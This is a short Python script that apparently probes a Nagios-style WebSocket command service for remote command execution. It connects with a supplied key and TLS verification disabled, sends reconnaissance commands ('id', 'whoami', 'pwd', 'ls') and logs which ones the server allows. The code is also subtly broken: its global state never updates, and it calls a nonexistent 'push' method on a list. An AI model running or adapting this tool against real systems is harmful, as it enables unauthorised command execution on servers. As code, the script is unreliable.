import websocket
import argparse
import ssl
import json
import asyncio
import _thread as thread
import threading

uniqid = ""
key = ""
tests = ['id', 'whoami', 'pwd', 'ls']
testcmd = ""
works = []
semaphore = threading.Semaphore()


def on_open(ws):
    def run():
        for c in tests:
            semaphore.acquire()
            print('testing command: {}'.format(c))
            cmd = c
            testcmd = c
            ws.send(toJson("execute_nagios_command", testcmd))
    thread.start_new_thread(run, ())

def toJson(task, data):
    req = {
            "task": task,
            "data": data,
            "uniqid": uniqid,
            "key": key
            }

    return json.dumps(req)

def on_message(ws, message):
    mes = json.loads(message)
    if "uniqid" in mes:
        uniqid = mes["uniqid"]

    if mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "connection":
        print("[+] Connected")
    elif mes["type"] == "response":
        print("[+] Received a response to cmd: {}".format(testcmd))
        print(testcmd)
        if 'Forbidden' in mes["payload"]:
            print("[-] Command not allowed")
            semaphore.release()
        else:
            print("[+] {} is allowed".format(testcmd))
            works.push(testcmd)
            semaphore.release()
    else:
        pass


def on_error(ws, error):
    print(error)

def on_close(ws):
    print('[+] Connection Closed.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('--url', '-u',
            required=True,
            dest='url',
            help='WebSocket url')
    
    parser.add_argument('--key','-k',
            required=True,
            dest='key',
            help='WebScoket key')

    parser.add_argument('--verbose', '-V',
            help='Print more data',
            action='store_true')

    args = parser.parse_args()

    key = args.key
    websocket.enableTrace(args.verbose)
    ws = websocket.WebSocketApp(args.url,
                               on_message = on_message,
                               on_error = on_error,
                               on_close = on_close,
                               on_open = on_open)
    ws.run_forever(sslopt={"cert_reqs":ssl.CERT_NONE})
